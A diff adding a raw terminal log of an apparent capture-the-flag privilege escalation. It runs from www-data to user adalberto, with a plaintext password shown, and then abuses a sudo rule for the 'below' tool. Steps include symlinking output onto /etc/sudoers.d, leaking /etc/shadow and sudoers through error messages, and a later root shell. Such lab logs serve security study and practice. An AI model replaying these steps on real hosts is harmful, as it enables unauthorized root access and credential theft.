@@ -1,0 +1,1212 @@
+www-data@ip-10-0-3-227:/var/www/blogo$ whoami
+whoami
+www-data
+www-data@ip-10-0-3-227:/var/www/blogo$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),101(mysql)
+www-data@ip-10-0-3-227:/var/www/blogo$ uname -a
+uname -a
+Linux ip-10-0-3-227 6.8.0-1021-aws #23-Ubuntu SMP Mon Dec  9 23:59:34 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+www-data@ip-10-0-3-227:/var/www/blogo$ sudo -l
+sudo -l
+[sudo] password for www-data: 
+
+Sorry, try again.
+[sudo] password for www-data: WPcmqw16ZmzO!5paSC4^[[A
+
+Sorry, try again.
+[sudo] password for www-data: WPcmqw16ZmzO!5paSC4
+
+sudo: 3 incorrect password attempts
+www-data@ip-10-0-3-227:/var/www/blogo$ 
+
+www-data@ip-10-0-3-227:/var/www/blogo$ find / -perm -4000 -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/sudo
+www-data@ip-10-0-3-227:/var/www/blogo$ getcap -r / 2>/dev/null
+getcap -r / 2>/dev/null
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
+www-data@ip-10-0-3-227:/var/www/blogo$ cat /etc/crontab
+ls -la /etc/cron*cat /etc/crontab
+cat: /etc/crontab: No such file or directory
+www-data@ip-10-0-3-227:/var/www/blogo$ 
+
+www-data@ip-10-0-3-227:/var/www/blogo$ ls -la /root
+cat /root/flag.txtls -la /root
+ls: cannot open directory '/root': Permission denied
+www-data@ip-10-0-3-227:/var/www/blogo$ 
+
+www-data@ip-10-0-3-227:/var/www/blogo$ groups
+groups
+www-data mysql
+www-data@ip-10-0-3-227:/var/www/blogo$ 
+
+www-data@ip-10-0-3-227:/var/www/blogo$ ps aux | grep root
+ps aux | grep root
+root           1  0.0  0.3   4588  3456 pts/0    Ss+  19:13   0:00 bash
+root          26  0.0  1.3 203872 12932 ?        Ss   19:13   0:00 /usr/sbin/apache2 -k start
+www-data     454  0.0  0.2   3912  2048 pts/4    S+   19:22   0:00 grep root
+www-data@ip-10-0-3-227:/var/www/blogo$ 
+
+
+www-data@ip-10-0-3-227:/var/www/blogo$ find / -writable -type d 2>/dev/null     
+find / -writable -type d 2>/dev/null
+/proc/456/task/456/fd
+/proc/456/fd
+/proc/456/map_files
+/tmp
+/dev/mqueue
+/dev/shm
+/var/lib/php/sessions
+/var/cache/apache2/mod_cache_disk
+/var/tmp
+/var/log/below
+/var/www/blogo
+/var/www/blogo/config
+/var/www/blogo/files
+/run/lock
+/run/lock/apache2
+/run/apache2/socks
+www-data@ip-10-0-3-227:/var/www/blogo$ 
+
+www-data@ip-10-0-3-227:/var/www/blogo$ ls -la /var/lib/mysql
+ls -la /var/lib/mysql
+ls: cannot open directory '/var/lib/mysql': Permission denied
+www-data@ip-10-0-3-227:/var/www/blogo$ ls -la /var/lib/mysql-files
+ls -la /var/lib/mysql-files
+ls: cannot open directory '/var/lib/mysql-files': Permission denied
+
+www-data@ip-10-0-3-227:/var/www/blogo$ ls -la /var/lib/mysql
+ls -la /var/lib/mysql
+ls: cannot open directory '/var/lib/mysql': Permission denied
+www-data@ip-10-0-3-227:/var/www/blogo$ su adalberto
+su adalberto
+Password: WPcmqw16ZmzO!5paSC4
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo -i
+sudo -i
+[sudo] password for adalberto: WPcmqw16ZmzO!5paSC4
+
+Sorry, user adalberto is not allowed to execute '/bin/bash' as root on ip-10-0-3-227.
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo -l
+sudo -l
+Matching Defaults entries for adalberto on ip-10-0-3-227:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User adalberto may run the following commands on ip-10-0-3-227:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/below *, !/usr/local/bin/below
+        --config*, !/usr/local/bin/below --debug*, !/usr/local/bin/below -d*
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+adalberto@ip-10-0-3-227:/var/www/blogo$ file /usr/local/bin/below              
+file /usr/local/bin/below
+bash: file: command not found
+adalberto@ip-10-0-3-227:/var/www/blogo$ /usr/local/bin/below --help
+/usr/local/bin/below --help
+Usage: below [OPTIONS] [COMMAND]
+
+Commands:
+  live      Display live system data (interactive) (default)
+  record    Record local system data (daemon mode)
+  replay    Replay historical data (interactive)
+  debug     Debugging facilities (for development use)
+  dump      Dump historical data into parseable text format
+  snapshot  Create a historical snapshot file for a given time range
+  help      Print this message or the help of the given subcommand(s)
+
+Options:
+      --config <CONFIG>  [default: /etc/below/below.conf]
+  -d, --debug            
+  -h, --help             Print help
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+adalberto@ip-10-0-3-227:/var/www/blogo$ strings /usr/local/bin/below | less              
+strings /usr/local/bin/below | less
+bash: less: command not found
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│02/27/2026 19:30:32 UTC-03:00     Elapsed: 0s     ip-10-0-3-227     0.8.1     │
+│live                                                                          │
+└──────────────────────────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────────────────┐
+│CPU            Usage    ?                    User     ?                       │
+│System   ?                                                                    │
+│Mem            Total    918.2 MB             Free     76.6 MB                 │
+│Anon     494.8 MB             File     160.8 MB                               │
+│VM             Page In  ?                    Page Out ?                       │
+│Swap In  ?                    Swap Out ?                                      │
+│I/O   (Rd|Wr)                                                                 │
+│Iface (Rx|Tx)  docker0  ?         |?         ens5     ?         |?            │
+│lo       ?         |?                                                         │
+└──────────────────────────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────────────────┐
+│General   CPU   Mem   I/O   Pressure   Properties                             │
+│──────────────────────────────────────────────────────────────────────────────│
+│Name                                               CPU        Mem        CPU P│
+│──────────────────────────────────────────────────────────────────────────────│
+│<root>                                             ?          ?          0.00%│
+│▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒-------------------------------------------------│
+│──────────────────────────────────────────────────────────────────────────────│
+└──────────────────────────────────────────────────────────────────────────────┘
+
+
+
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│02/27/2026 19:31:33 UTC-03:00     Elapsed: 5s     ip-10-0-3-227     0.8.1     │
+│live                                                                          │
+└──────────────────────────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────────────────┐
+│CPU            Usage    1.90%                User     0.50%                   │
+│System   1.40%                                                                │
+│Mem            Total    918.2 MB             Free     70.9 MB                 │
+│Anon     496.1 MB             File     161.3 MB                               │
+│VM             Page In  0.0 B/s              Page Out 0.0 B/s                 │
+│Swap In  0.0 B/s              Swap Out 0.0 B/s                                │
+│I/O   (Rd|Wr)  nvme0n1  0.0 B/s   |0.0 B/s                                    │
+│Iface (Rx|Tx)  docker0  0.0 B     |0.0 B     ens5     44.9 B    |474.9 B      │
+│lo       0.0 B     |0.0 B                                                     │
+└──────────────────────────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────────────────┐
+│General   CPU   Mem   I/O   Pressure   Properties                             │
+│──────────────────────────────────────────────────────────────────────────────│
+│Name                                               CPU        Mem        CPU P│
+│──────────────────────────────────────────────────────────────────────────────│
+│<root>                                             4.34!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!1
+│▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒-------------------------------------------------│
+│──────────────────────────────────────────────────────────────────────────────│
+└──────────────────────────────────────────────────────────────────────────────┘
+
+
+
+
+
+
+┌──────────────────────────────────────────────────────────────────────────────┐
+│02/27/2026 19:35:57 UTC-03:00     Elapsed: 5s     ip-10-0-3-227     0.8.1     │
+│live-paused                                                                   │
+└──────────────────────────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────────────────┐
+│CPU            Usage    4.30%                User     1.10%                   │
+│System   2.90%                                                                │
+│Mem            Total    918.2 MB             Free     100.9 MB                │
+│Anon     506.3 MB             File     128.4 MB                               │
+│VM             Page In  0.┌┤ Filter by Idx        ├┐t 0.0 B/s                 │
+│Swap In  0.0 B/s          │                        │                          │
+│I/O   (Rd|Wr)  nvme0n1  0.│ usr/local/bin/below sn │                          │
+│Iface (Rx|Tx)  docker0  0.│                        │  55.2 B    |856.8 B      │
+│lo       0.0 B     |0.0 B │       <Close> <Filter> │                          │
+└──────────────────────────└────────────────────────┘──────────────────────────┘
+┌──────────────────────────────────────────────────────────────────────────────┐
+│CPU   Mem   Vm   Slab   Disk   Btrfs                                          │
+│──────────────────────────────────────────────────────────────────────────────│
+│Idx        Usage      User       System     Idle       Nice       IOWait     I│
+│──────────────────────────────────────────────────────────────────────────────│
+│0          4.39%      1.00%      2.99%      95.61%     0.00%      0.00%      0│ow snapshot /tmp/test.snap
+│▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒----------------------------------│
+│──────────────────────────────────────────────────────────────────────────────│
+└──────────────────────────────────────────────────────────────────────────────┘
+
+
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo /usr/local/bin/below snapshot /tmp/test.snap
+sudo /usr/local/bin/below snapshot /tmp/test.snap
+error: unexpected argument '/tmp/test.snap' found
+
+Usage: below snapshot [OPTIONS] --begin <BEGIN>
+
+For more information, try '--help'.
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~ls -la /tmp/test.snap^[[201~
+ls -la /tmp/test.snap
+ls: cannot access '/tmp/test.snap': No such file or directory
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo /usr/local/bin/below snapshot --help --help^[[201~
+Create a historical snapshot file for a given time range
+
+Usage: below snapshot [OPTIONS] --begin <BEGIN>
+
+Options:
+  -b, --begin <BEGIN>        Begin time, same format as replay
+  -e, --end <END>            End time, same format as replay
+      --duration <DURATION>  Time string specifying the snapshot duration, e.g. "10 min"
+                             
+                             Keywords: days min, h, sec
+                             
+                             Relative: {humantime}, e.g. "2 days 3 hr 15m 10sec"
+                             
+                             _
+  -o, --output <OUTPUT>      Output file path. Randomized name in current directory if unspecified
+  -s, --host <HOST>          Supply hostname to take snapshot from remote
+      --port <PORT>          Override default port to connect to remote
+  -h, --help                 Print help
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --help^[[201~
+sudo /usr/local/bin/below dump --help
+Dump historical data into parseable text format
+
+Usage: below dump [OPTIONS] <COMMAND>
+
+Commands:
+  system         Dump system stats
+  disk           Dump disk stats
+  btrfs          Dump btrfs Stats
+  process        Dump process stats
+  cgroup         Dump cgroup stats
+  iface          Dump the link layer iface stats
+  network        Dump the network layer stats including ip and icmp
+  transport      Dump the transport layer stats including tcp and udp
+  ethtool-queue  Dump network interface queue stats
+  help           Print this message or the help of the given subcommand(s)
+
+Options:
+  -s, --host <HOST>          Supply hostname to activate remote dumping
+      --port <PORT>          Override default port to connect remote dumping to
+      --snapshot <SNAPSHOT>  Dump from a snapshot file generated by the snapshot command instead of
+                             from the store directory
+  -h, --help                 Print help
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+          
+          N.B. Since the active shard cannot be deleted, the size limit may be exceeded by a single
+          active shard.
+
+      --collect-io-stat
+          Whether or not to collect io.stat for cgroups which could be expensive
+
+      --port <PORT>
+          Override default port for remote viewing server
+
+      --skew-detection-threshold-ms <SKEW_DETECTION_THRESHOLD_MS>
+          Threshold for hold long data collection takes to trigger warnings
+          
+          [default: 500]
+
+      --disable-disk-stat
+          Flag to disable disk_stat collection
+
+      --disable-exitstats
+          Flag to disable eBPF-based exitstats
+
+      --compress
+          Enable zstd data file compression
+          
+          Depending on typical data, you can expect around 10x smaller data files, and an even
+          higher compression ratio if used with --dict-compress-chunk-size.
+
+      --dict-compress-chunk-size <DICT_COMPRESS_CHUNK_SIZE>
+          Only valid when used with --compress. Must be at least 2, a power of 2, and at most 32768.
+          
+          If specified, zstd dictionary compression is used in aligned chunks of size
+          --dict-compress-chunk-size. The first frame of each is used as a zstd dictionary for the
+          frames in the rest of the chunk.
+          
+          With --dict-compress-chunk-size 16, you can expect around 20-30x smaller data files.
+
+  -h, --help
+          Print help (see a summary with '-h')
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo /usr/local/bin/below snapshot -b "1 min ago" -o /etc/sudoers.d/pwns.d/pwn^[[201~
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 0/60Feb 27 19:42:38.808 WARN Expected file does not exist: /var/log/below/store/index_01772150400
+Feb 27 19:42:38.808 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: Failed to convert store for snapshot: Failed to read directory /var/log/below/store: No such file or directory (os error 2)
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~ls -la /etc/sudoers.d/^[[201~
+ls -la /etc/sudoers.d/
+total 16
+drwxr-xr-x 2 root root 4096 Jan 12 18:13 .
+drwxr-xr-x 1 root root 4096 Feb 27 19:13 ..
+-r--r----- 1 root root 1068 Jan 29  2024 README
+-r--r----- 1 root root  149 Jan 12 18:13 adalberto-below
+adalberto@ip-10-0-3-227:/var/www/blogo$ echo "adalberto ALL=(ALL) NOPASSWD:ALL" > /tmp/x /tmp/x^[[201~
+adalberto@ip-10-0-3-227:/var/www/blogo$ > /tmp/x
+                                                                               p
+adalberto@ip-10-0-3-227:/var/www/blogo$ ln -sf /etc/sudoers.d/pwn /tmp/test.snap t.snap^[[201~
+ln -sf /etc/sudoers.d/pwn /tmp/test.snap 
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo /usr/local/bin/below snapshot -b "1 min ago" -o /tmp/test.snapst.snap^[[201~
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 0/60Feb 27 19:43:15.410 WARN Expected file does not exist: /var/log/below/store/index_01772150400
+Feb 27 19:43:15.410 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: Failed to convert store for snapshot: Failed to read directory /var/log/below/store: No such file or directory (os error 2)
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo /usr/local/bin/below snapshot -b "1 min ago" -o /root/testot/test^[[201~
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 0/60Feb 27 19:43:19.815 WARN Expected file does not exist: /var/log/below/store/index_01772150400
+Feb 27 19:43:19.815 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: Failed to convert store for snapshot: Failed to read directory /var/log/below/store: No such file or directory (os error 2)
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo mkdir -p /var/log/below/store^[[201~
+sudo mkdir -p /var/log/below/store
+[sudo] password for adalberto: WPcmqw16ZmzO!5paSC4
+
+Sorry, user adalberto is not allowed to execute '/usr/bin/mkdir -p /var/log/below/store' as root on ip-10-0-3-227.
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo /usr/local/bin/below dump system --snapshot /etc/passwd/passwd^[[201~
+error: unexpected argument '--snapshot' foundhot /etc/passwd
+
+Usage: below dump system [OPTIONS] --begin <BEGIN>
+
+For more information, try '--help'.
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /etc/passwd system --begin "1 min ago"
+Feb 27 19:46:40.410 ERRO  dump --snapshot /etc/passwd system --begin "1 min ago"
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: numeric field was not a number: login
+sy when getting cksum for root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /root/flag.txt system --begin "1 min ago"
+Feb 27 19:47:16.005 ERRO  dump --snapshot /root/flag.txt system --begin "1 min ago"
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: failed to read entire block
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ sudo /usr/local/bin/below dump --snapshot /root system --begin "1 min ago"in ago"^[[201~
+Feb 27 19:47:54.194 ERRO  dump --snapshot /root system --begin "1 min ago"
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: Is a directory (os error 21)
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /proc/self/root/root/flag.txt system --begin "1 min ago"cal/bin/below dump --snapshot /proc/self/root/root/flag.txt system --begin "1 min ago"
+Feb 27 19:48:17.632 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: failed to read entire block
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /etc/shadow system --begin "1 min ago"
+Feb 27 19:49:25.972 ERRO  dump --snapshot /etc/shadow system --begin "1 min ago"
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: numeric field was not a number: 999:7::: when getting cksum for root:*:20237:0:99999:7:::
+daemon:*:20237:0:99999:7:::
+bin:*:20237:0:99999:7:::
+sys:*:20237:0:99999:7
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /root/.bash_history system --begin "1 min ago"do /usr/local/bin/below dump --snapshot /root/.bash_history system --begin "1 min ago"
+Feb 27 19:54:22.750 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: failed to read entire block
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~cat /etc/sudoers^[[201~
+cat /etc/sudoers
+cat: /etc/sudoers: Permission denied
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~ls -la /etc/sudoers.d^[[201~
+ls -la /etc/sudoers.d
+total 16
+drwxr-xr-x 2 root root 4096 Jan 12 18:13 .
+drwxr-xr-x 1 root root 4096 Feb 27 19:13 ..
+-r--r----- 1 root root 1068 Jan 29  2024 README
+-r--r----- 1 root root  149 Jan 12 18:13 adalberto-below
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~cat /etc/sudoers.d/*^[[201~
+cat /etc/sudoers.d/*
+cat: /etc/sudoers.d/README: Permission denied
+cat: /etc/sudoers.d/adalberto-below: Permission denied
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /etc/sudoers system --begin "1 min ago"
+Feb 27 19:57:45.723 ERRO  dump --snapshot /etc/sudoers system --begin "1 min ago"
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: numeric field was not a number: difying  when getting cksum for #
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local con
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /etc/sudoers.d/adalberto-below system --begin "1 min ago"al/bin/below dump --snapshot /etc/sudoers.d/adalberto-below system --begin "1 min ago"
+Feb 27 19:57:50.404 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: failed to read entire block
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+
+
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --sudo /usr/local/bin/below dump --snapshot /etc/sudoers.d/README system --begin "1 min ago" /usr/local/bin/below dump --snapshot /etc/sudoers.d/README system --begin "1 min ago"
+Feb 27 20:00:28.126 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: numeric field was not a number: his will when getting cksum for #
+# The default /etc/sudoers file created on installation of the
+# sudo  package now includes the di
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ ^[[200~sudo /usr/local/bin/below dump --snapssudo /usr/local/bin/below dump --snapshot /proc/1/environ system --begin "1 min ago"3~sudo /usr/local/bin/below dump --snapshot /proc/1/environ system --begin "1 min ago"
+Feb 27 20:00:37.514 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: failed to iterate over archive: failed to read entire block
+-------------------------------------------------------------
+adalberto@ip-10-0-3-227:/var/www/blogo$ 
+
+
+root@ip-10-0-135-180:~# cd .local
+cd .local
+root@ip-10-0-135-180:~/.local# ls -la
+ls -la
+total 16
+drwxr-xr-x 1 root root 4096 Jan 12 18:12 .
+drwx------ 1 root root 4096 Mar 12 09:13 ..
+drwx------ 1 root root 4096 Jan 12 18:12 share
+root@ip-10-0-135-180:~/.local# cd share
+cd share
+root@ip-10-0-135-180:~/.local/share# l s-la
+l s-la
+ls: cannot access 's-la': No such file or directory
+root@ip-10-0-135-180:~/.local/share# ls -la
+ls -la
+total 12
+drwx------ 1 root root 4096 Jan 12 18:12 .
+drwxr-xr-x 1 root root 4096 Jan 12 18:12 ..
+drwx------ 1 root root 4096 Jan 14 14:37 nano
+root@ip-10-0-135-180:~/.local/share# cd nano
+cd nano
+root@ip-10-0-135-180:~/.local/share/nano# ls -la
+ls -la
+total 12
+drwx------ 1 root root 4096 Jan 14 14:37 .
+drwx------ 1 root root 4096 Jan 12 18:12 ..
+-rw------- 1 root root   75 Jan 16 03:01 search_history
+root@ip-10-0-135-180:~/.local/share/nano# cat search_history 
+cat search_history
+Entrar
+<span>Blogo</span>
+assistir
+fetch
+secure_file_priv
+mysqld
+aether
+
+
+root@ip-10-0-135-180:/etc# ls -la
+ls -la
+total 636
+drwxr-xr-x 1 root root    4096 Mar 12 09:02 .
+drwxr-xr-x 1 root root    4096 Mar 12 09:02 ..
+-rw------- 1 root root       0 May 28  2025 .pwd.lock
+drwxr-xr-x 2 root root    4096 Jan 11 16:18 PackageKit
+drwxr-xr-x 3 root root    4096 Jan 11 16:18 X11
+-rw-r--r-- 1 root root    3444 Jul  5  2023 adduser.conf
+drwxr-xr-x 1 root root    4096 Jan 12 18:12 alternatives
+drwxr-xr-x 1 root root    4096 Jan  7 19:09 apache2
+drwxr-xr-x 3 root root    4096 Jan  7 19:09 apparmor.d
+drwxr-xr-x 1 root root    4096 May 28  2025 apt
+-rw-r--r-- 1 root root    2319 Mar 31  2024 bash.bashrc
+drwxr-xr-x 2 root root    4096 Jan 11 14:33 bash_completion.d
+-rw-r--r-- 1 root root     367 Aug  2  2022 bindresvport.blacklist
+drwxr-xr-x 2 root root    4096 Nov 25 15:16 binfmt.d
+drwxr-xr-x 3 root root    4096 Jan  7 19:05 ca-certificates
+-rw-r--r-- 1 root root    6288 Jan  7 19:09 ca-certificates.conf
+drwxr-xr-x 2 root root    4096 May 28  2025 cloud
+drwx------ 2 root root    4096 Nov 25 15:16 credstore
+drwx------ 2 root root    4096 Nov 25 15:16 credstore.encrypted
+drwxr-xr-x 1 root root    4096 Jan  7 19:09 cron.d
+drwxr-xr-x 1 root root    4096 Jan 11 14:32 cron.daily
+drwxr-xr-x 4 root root    4096 Jan 11 16:17 dbus-1
+-rw-r--r-- 1 root root    2967 Apr 12  2024 debconf.conf
+-rw-r--r-- 1 root root      11 Apr 22  2024 debian_version
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 default
+-rw-r--r-- 1 root root    1706 Jul  5  2023 deluser.conf
+drwxr-xr-x 3 root root    4096 Jan 11 16:18 dhcp
+drwxr-xr-x 1 root root    4096 Jan 11 14:33 dpkg
+-rw-r--r-- 1 root root     685 Apr  8  2024 e2scrub.conf
+-rw-r--r-- 1 root root     106 May 28  2025 environment
+-rw-r--r-- 1 root root    1853 Oct 17  2022 ethertypes
+-rw-r--r-- 1 root root      37 May 28  2025 fstab
+-rw-r--r-- 1 root root    2584 Jan 30  2024 gai.conf
+drwxr-xr-x 2 root root    4096 May 28  2025 gnutls
+-rw-r--r-- 1 root root    3986 Dec  3 12:01 gprofng.rc
+-rw-r--r-- 1 root root     684 Jan 15 12:00 group
+-rw-r--r-- 1 root root     684 Jan 15 12:00 group-
+-rw-r----- 1 root shadow   587 Jan 15 12:00 gshadow
+-rw-r----- 1 root shadow   587 Jan 15 12:00 gshadow-
+drwxr-xr-x 3 root root    4096 Jan  7 19:05 gss
+-rw-r--r-- 1 root root      92 Apr 22  2024 host.conf
+-rw-r--r-- 1 root root      16 Mar 12 09:02 hostname
+-rw-r--r-- 1 root root     221 Mar 12 09:02 hosts
+drwxr-xr-x 2 root root    4096 Jan  7 19:09 init
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 init.d
+-rw-r--r-- 1 root root    1875 Mar 31  2024 inputrc
+-rw-r--r-- 1 root root      26 Feb  5  2025 issue
+-rw-r--r-- 1 root root      19 Feb  5  2025 issue.net
+drwxr-xr-x 1 root root    4096 Jan 11 16:17 kernel
+-rw-r--r-- 1 root root   12915 Jan 12 17:41 ld.so.cache
+-rw-r--r-- 1 root root      34 Aug  2  2022 ld.so.conf
+drwxr-xr-x 1 root root    4096 Jan 11 14:33 ld.so.conf.d
+drwxr-xr-x 2 root root    4096 Jan  7 19:05 ldap
+-rw-r--r-- 1 root root     267 Apr 22  2024 legal
+-rw-r--r-- 1 root root     191 Mar 30  2024 libaudit.conf
+-rw-r--r-- 1 root root      13 May 28  2025 locale.conf
+lrwxrwxrwx 1 root root      37 Jan  7 19:09 localtime -> /usr/share/zoneinfo/America/Sao_Paulo
+drwxr-xr-x 5 root root    4096 Jan  7 19:05 logcheck
+-rw-r--r-- 1 root root   12345 Feb 22  2024 login.defs
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 logrotate.d
+-rw-r--r-- 1 root root     104 Feb  5  2025 lsb-release
+-rw-r--r-- 1 root root      33 Jan 11 16:17 machine-id
+-rw-r--r-- 1 root root     288 Mar 30  2024 mecabrc
+-rw-r--r-- 1 root root   75113 Jul 12  2023 mime.types
+-rw-r--r-- 1 root root     744 Apr  8  2024 mke2fs.conf
+drwxr-xr-x 2 root root    4096 Jan 11 16:17 modules-load.d
+lrwxrwxrwx 1 root root      12 Mar 12 09:02 mtab -> /proc/mounts
+drwxr-xr-x 1 root root    4096 Jan 15 12:02 mysql
+-rw-r--r-- 1 root root   11424 May 23  2023 nanorc
+-rw-r--r-- 1 root root     767 Mar 30  2024 netconfig
+drwxr-xr-x 8 root root    4096 Jan 11 16:18 networkd-dispatcher
+-rw-r--r-- 1 root root      91 Apr 22  2024 networks
+-rw-r--r-- 1 root root     526 Jan 11 16:18 nsswitch.conf
+drwxr-xr-x 2 root root    4096 May 28  2025 opt
+lrwxrwxrwx 1 root root      21 Feb  5  2025 os-release -> ../usr/lib/os-release
+-rw-r--r-- 1 root root     552 Oct 13  2022 pam.conf
+drwxr-xr-x 1 root root    4096 Jan 12 17:41 pam.d
+-rw-rw-rw- 1 root root    1350 Mar 12 09:09 passwd
+-rw-r--r-- 1 root root    1264 Jan 11 16:18 passwd-
+drwxr-xr-x 3 root root    4096 Jan  7 19:05 perl
+drwxr-xr-x 3 root root    4096 Jan  7 19:05 php
+drwxr-xr-x 3 root root    4096 Jan 11 16:18 pm
+drwxr-xr-x 3 root root    4096 Jan 11 16:18 polkit-1
+-rw-r--r-- 1 root root     582 Apr 22  2024 profile
+drwxr-xr-x 2 root root    4096 May 28  2025 profile.d
+-rw-r--r-- 1 root root    3144 Oct 17  2022 protocols
+drwxr-xr-x 2 root root    4096 Jan 11 16:18 python3
+drwxr-xr-x 2 root root    4096 Jan 11 16:17 python3.12
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 rc0.d
+drwxr-xr-x 1 root root    4096 Jan  7 19:09 rc1.d
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 rc2.d
